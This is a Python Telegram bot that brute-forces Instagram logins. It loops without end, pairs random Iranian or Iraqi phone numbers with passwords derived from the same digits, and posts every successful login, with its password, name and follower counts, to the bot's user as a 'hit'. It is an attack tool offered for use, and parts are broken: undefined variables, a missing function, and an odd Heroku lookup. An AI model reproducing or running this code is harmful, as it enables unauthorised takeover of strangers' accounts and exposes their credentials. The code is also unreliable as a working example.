import webbrowser  
import requests
import random
import telebot
import os
from telebot import types
from uuid import uuid4
import webbrowser
import time
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E = '\033[1;31m' #احمر
C = "\033[1;97m" #ابيض
import time
import pyfiglet
import sys
Z = '' #احمر
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
j('\033[1;31m*  *'*12)
hunter = pyfiglet.figlet_format("B     O    T")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/1000)
j(X+hunter)
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
j('\033[1;31m*  *'*12)
print(' ')
ToKen = input(Y+ " Token TeLe :-")
print(A+'=====================================')
print(F+'go to your bot and Click (start)✅')
print(X+'×××××××××××××××××××××××××××××××××')
print('اذهب الى بوتك واضغط ستارت او اكتب ستارت ✅')
bot = telebot.TeleBot(ToKen)
@bot.message_handler(commands = ["start"])
def Start(message):
 Name = message.chat.first_name
 User = message.from_user.username 
 ID = message.chat.id
 A = types.InlineKeyboardMarkup(row_width=2)
 B = types.InlineKeyboardButton(text ="Bot Channel 📟" , url = "t.me/q60pp")
 D =  types.InlineKeyboardButton(text = "Start Hack",callback_data="y")
 A.add(B,D)
 bot.reply_to(message, """
📟 HI WELCOME TO MY WORLD 📟
         ♻️♻️♻️♻️♻️♻️♻️♻️♻️
 
""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)	
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data =="y":
        button(call.message)
    if call.data =="Iran":
        Iran(call.message)
    if call.data =="Iraq":
         Iraq(call.message)
         Morocco(call.message)
Z  = types.InlineKeyboardButton(text = "🇮🇷 ⓘⓡⓐⓝ : ", callback_data= 'Iran')
A = types.InlineKeyboardButton(text = "🇮🇶 ⓘⓡⓐⓠ : ", callback_data = 'Iraq')
def button(message):
    O0 = types.InlineKeyboardMarkup(row_width=1)
    O0.add(Z,A)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**ChOoSe Country 🔛:-**",parse_mode='markdown',reply_markup=O0)          
def Iran(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = "+98903"+us
		password = "0903"+us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_Basha = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_Basha}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			bas=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			BAS = requests.get(f"https://dashboard.heroku.com/apps/bashabot/deploy/heroku-git={bas}") 
			BAS1 = BAS.json()            
			data = BAS1['data']		            	
			H+=1
			Hit = (f"""			
HI THIS ACOUNT 4 YOU
××××××××××××××××××××
√ EmAiL : {username} 
√ UsEr : {user_Basha} 
√ PaSsWoRd :  {password} 
√ FoLlOwInG :  {following} 
√ FoLloWeS : {followes}
√ NaMe : {name} 
√ DaTe :  {data} 
×××××××××××××××××××××
√ Ch:- @q60pp Dev:- @q60ppbot
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Error:- {B} ",callback_data='Basha')
		A2 = types.InlineKeyboardButton(f"✅ Good  : {H}",callback_data='Basha1')
		A3 = types.InlineKeyboardButton(f"♻️ scor : {S}",callback_data='Basha2')
		A4 = types.InlineKeyboardButton(f" {username}",callback_data='Basha3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="* ♻️ Wite Acount.... ♻️*",parse_mode = "markdown",reply_markup=o) 
		
def Iraq(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+964790' + us
		password = '0790' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_Basha = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_Basha}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			bas=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			BAS = requests.get(f"https://dashboard.heroku.com/apps/bashabot/deploy/heroku-git={bas}") 
			BAS1 = BAS.json()            
			data = BAS1['data']		            	
			H+=1
			Hit = (f"""			
HI THIS ACOUNT 4 YOU
××××××××××××××××××××
√ EmAiL : {username} 
√ UsEr : {user_Basha} 
√ PaSsWoRd :  {password} 
√ FoLlOwInG :  {following} 
√ FoLloWeS : {followes}
√ NaMe : {name} 
√ DaTe :  {data} 
×××××××××××××××××××××
√ Ch:- @q60pp Dev:- @q60ppbot
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		s1 = types.InlineKeyboardButton(f"❌ Error:- {q} ",callback_data='Basha')
		s2 = types.InlineKeyboardButton(f"✅ Good : {a}",callback_data='Basha1')
		s3 = types.InlineKeyboardButton(f"♻️ scor : {s}",callback_data='Basha2')
		s4 = types.InlineKeyboardButton(f" {username}",callback_data='Basha3')
		o.add(s1,s2,s3,s4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*♻️ Wite Acount.... ♻️*",parse_mode = "markdown",reply_markup=o) 
def TR(message):	
	q = 0
	a = 0
	s = 0
def sss1(message):
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong> Check\nuser</strong>",parse_mode="html")		
bot.polling(True)
